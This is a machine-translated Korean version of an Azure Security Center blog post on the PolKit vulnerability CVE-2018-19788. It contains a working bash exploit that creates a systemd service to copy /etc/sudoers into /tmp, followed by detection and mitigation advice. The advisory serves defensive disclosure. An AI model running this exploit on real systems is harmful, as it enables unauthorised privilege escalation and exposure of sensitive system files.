### YamlMime:Yaml
ms.openlocfilehash: fbb395da02cf63867c19e231652735ea87314242
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 03/11/2022
ms.locfileid: "139897770"
Slug: azure-security-center-can-detect-emerging-vulnerabilities-in-linux
Title: Azure Security Center는 Linux에서 새로운 취약성을 검색할 수 있습니다.
Summary: 최근에 Unix와 유사한 OS에서 시스템 차원의 권한을 제어하는 구성 요소인 PolKit에서 새로운 결함이 발견되었습니다. 이 취약성으로 권한 없는 계정에 루트 권한이 있을 수 있습니다.
Content: "<p>최근 Unix와 유사한 OS에서 시스템 차원의 권한을 제어하는 구성 요소인 PolKit에서 새로운 결함이 발견되었습니다. 이 취약성으로 권한 없는 계정에 루트 권한이 있을 수 있습니다. 이 블로그 게시물에서는 최근 취약성에 초점을 맞추고 공격자가 쉽게 악용하고 무기화하는 방법을 보여 줍니다. 또한 Azure Security Center를 통해 위협을 감지하고 완화 단계에 대한 권장 사항을 제공하는 방법을 미리 설정합니다.</p>\n\n<h2>PolKit 취약성</h2>\n\n<p>PolKit(이전의 PolicyKit)는 Unix와 유사한 OS에서 정책을 정의하고 처리하고 시스템 전체 권한을 제어하는 중앙 집중식 방법을 제공하는 구성 요소입니다. <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19788\" target=\"_blank\">CVE-2018-19788</a> 취약성은 권한 요청의 잘못된 유효성 검사로 인해 발생했습니다. 사용자 ID가 최대 정수보다 큰 권한이 없는 사용자가 루트 컨텍스트에서 임의 코드를 성공적으로 실행할 수 있습니다.</p>\n\n<p>이 취약성은 0.115 이전의 PolKits&rsquo; 버전 내에 존재하며, 이는 가장 인기 있는 일부 Linux 배포판에 의해 미리 설치됩니다. 패치가 릴리스되었지만 관련 패키지 관리자 발급자가 수동으로 설치해야 했습니다.<br>\npkttyagent -version&rdquo; 명령을 &ldquo;실행하여 컴퓨터가 취약한지 확인하고 PolKits&rsquo; 버전이 취약하지 않은지 확인할 수 있습니다.</p>\n\n<h2>공격자가 이 취약성을 악용하여 사용자 환경에 액세스하는 방법</h2>\n\n<p>이전에 게시된 <a href=\"https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh\" target=\"_blank\">POC(개념 증명)</a>에서 영감을 얻은 간단한 악용을 보여 줍니다. 악용은 공격자가 이 취약성을 활용하여 권한 상승 기술을 달성하고 액세스 제한 파일에 액세스하는 방법을 보여줍니다. 이 데모에서는 현재 가장 인기 있는 Linux 배포판 중 하나를 사용합니다.</p>\n\n<p>먼저 PolKit 버전을 확인하여 취약한 컴퓨터에 있는지 확인합니다. 그런 다음 사용자 ID가 최대 정수 값보다 큰지 확인합니다.</p>\n\n<p><a href=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/3e2ee96a-7d3d-4736-a9bc-e78d83983a76.png\"><img alt=\"Code verification that a user ID is greater than the maximal integer value screenshot\" border=\"0\" height=\"62\" src=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/83126b24-2cc3-430d-8f26-95592e6561bc.png\" style=\"border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;\" title=\"사용자 ID가 최대 정수 값보다 큰 코드 확인 스크린샷\" width=\"548\"></a></p>\n\n<p>이제 취약한 머신에 있다는 것을 알고 있으므로 PolKit을 권한 정책 적용자로 사용하고 임의 코드를 실행할 수 있는 다른 미리 설치된 도구인 Systemctl을 사용하여 이 결함을 활용할 수 있습니다. <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19788\" target=\"_blank\">CVE-2018-19788</a>을 자세히 살펴보면 Systemctl이 취약성의 영향을 받습니다. Systemctl은 Systemd 유틸리티 중 하나이며, Linux를 사용하여 빌드하기 위한 새로운 기반이 되고 있는 시스템 관리자입니다.</p>\n\n<p>Systemctl을 사용하면 루트 컨텍스트를 사용하여 악의적인 명령을 실행하기 위해 새 서비스를 만들 수 있습니다. PolKit의 결함으로 인해 권한 검사를 바이패스하고 systemctl 작업을 실행할 수 있습니다. &rsquo;우리가 어떻게 할 수 있는지 살펴보겠습니다.</p>\n\n<h3>Bash 스크립트 콘텐츠:</h3>\n\n<pre>\n#!/bin/bash\ncat &lt;&lt;EOF &gt;&gt; /tmp/polKitVuln.service\n[Unit]\nDescription= Abusing PolKit Vulnerability\n[Service]\nExecStart=<strong>/bin/bash -c &#39;cat /etc/sudoers &gt; /tmp/sudoersList.txt&#39;</strong>\nRestart=on-failure\nRuntimeDirectoryMode=0755\n \n[Install]\nWantedBy=multi-user.target\nAlias= polKitVuln.service\nEOF\n \nsystemctl enable /tmp/polKitVuln.service\nsystemctl start polKitVuln.service</pre>\n\n<p>먼저 새 서비스를 정의하고 /tmp/polkitVuln.service&rdquo;에 &ldquo;필요한 정보를 제공합니다. ExecStart 지시문에는 위에서 굵게 표시된 명령이 포함되어 있으며 sudoers 파일에 액세스하고 해당 콘텐츠를 공유 폴더에 복사합니다. 이 공유 폴더는 권한 없는 사용자가 액세스할 수 있습니다. Sudoers 파일은 컴퓨터의 사용자 및 그룹 권한 정보를 포함하므로 시스템에서 가장 중요한 파일 중 하나입니다. 스크립트의 마지막 부분에서 systemctl 도구를 실제로 호출하여 새 서비스를 만들고 시작합니다.</p>\n\n<h3>스크립트를 실행합니다.</h3>\n\n<p><a href=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/9cf9266a-6ef4-43d2-83b7-23f3cb9d8f40.png\"><img alt=\"Screenshot of code showing errors regarding Polkit failing to handle uid field\" border=\"0\" height=\"105\" src=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/73b5e3e6-8146-4f13-a7b1-a49829704e46.png\" style=\"border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;\" title=\"uid 필드를 처리하지 못하는 Polkit 관련 오류를 보여 주는 코드 스크린샷\" width=\"640\"></a></p>\n\n<p>uid 필드를 처리하지 못하는 Polkit 관련 오류를 확인합니다. 악용을 사용하여 Sudoers 파일이 복사되므로 해당 콘텐츠를 읽을 수 있습니다.</p>\n\n<p><a href=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/8e37e6e7-7405-4af8-91c4-20237aee2d24.png\"><img alt=\"Screenshot of code proving Sudoers file is copied using the exploitation\" border=\"0\" height=\"375\" src=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/3de5e801-cfe3-4281-ac85-3af2c5f79b4f.png\" style=\"border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;\" title=\"악용을 사용하여 Sudoers 파일이 복사됨을 증명하는 코드의 스크린샷\" width=\"640\"></a></p>\n\n<p>이 취약성을 통해 공격자는 사용 권한을 우회하여 사용자 환경에 대한 루트 액세스를 확인하고 얻을 수 있습니다. 또 다른 블로그 게시물인 &ldquo;<a href=\"https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-detect-attacks-against-your-linux-machines/\" target=\"_blank\">Azure Security Center가 Linux 머신</a>&rdquo;에 대한 공격을 탐지하는 방법을 통해 공격자가 호스트를 악용하여 암호화 광부를 설치하거나 다른 리소스를 공격하는 방법을 보여 줍니다.</p>\n\n<h2>Azure Security Center를 사용하여 위협으로부터 보호 및 대응</h2>\n\n<p>Azure Security Center는 PolKit 취약성과 같은 위협을 감지하고 이러한 위험을 신속하게 완화하는 데 도움이 될 수 있습니다. Azure Security Center는 보안 경고를 단일 대시보드에 통합하여 사용자 환경에서 위협을 보다 쉽게 확인하고 위협에 대한 대응의 우선 순위를 지정할 수 있도록 합니다. 각 경고는 인시던트에 대한 자세한 설명과 문제를 해결하는 방법에 대한 단계를 제공합니다.</p>\n\n<p>Azure Security Center 호스트의 영향을 조사하는 동안 머신이 공격을 받고 행동 감지 기술을 사용하는 빈도를 확인하고, 공격을 받은 경우 고객에게 알릴 수 있습니다. 다음은 Security Center에서 볼 수 있는 이전 활동을 기반으로 하는 보안 경고입니다.</p>\n\n<p><a href=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/49cfdc85-1286-45ad-891a-a4b3c37af921.png\"><img alt=\"Screenshot of security alert in Azure Security Center\" border=\"0\" height=\"480\" src=\"https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/dc29e0a5-e53d-4d39-9db8-4fbbaa68650d.png\" style=\"border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;\" title=\"Azure Security Center의 보안 경고 스크린샷\" width=\"603\"></a></p>\n\n<p>또한 Azure Security Center는 고객이 문제를 신속하게 해결할 수 있도록 하는 일련의 단계를 제공합니다.</p>\n\n<ul>\n <li>시스템 관리에서 2147483646보다 큰 부정 사용자 ID 또는 사용자 ID를 허용해서는 안 됩니다.\n <ul style=\"margin-left: 40px;\">\n  <li>/etc/login.defs에서 &ldquo;사용자 ID 최대값 및 최소값을 확인합니다.&rdquo;</li>\n </ul>\n </li>\n <li>패키지 관리자가 policykit 패키지를 미리 업그레이드합니다.</li>\n</ul>\n\n<h2>Azure Security Center 시작</h2>\n\n<p>지금 <a href=\"https://azure.microsoft.com/en-us/free/\" target=\"_blank\">Azure Security Centers&rsquo; 표준 계층</a> 을 무료로 사용하세요.</p>"
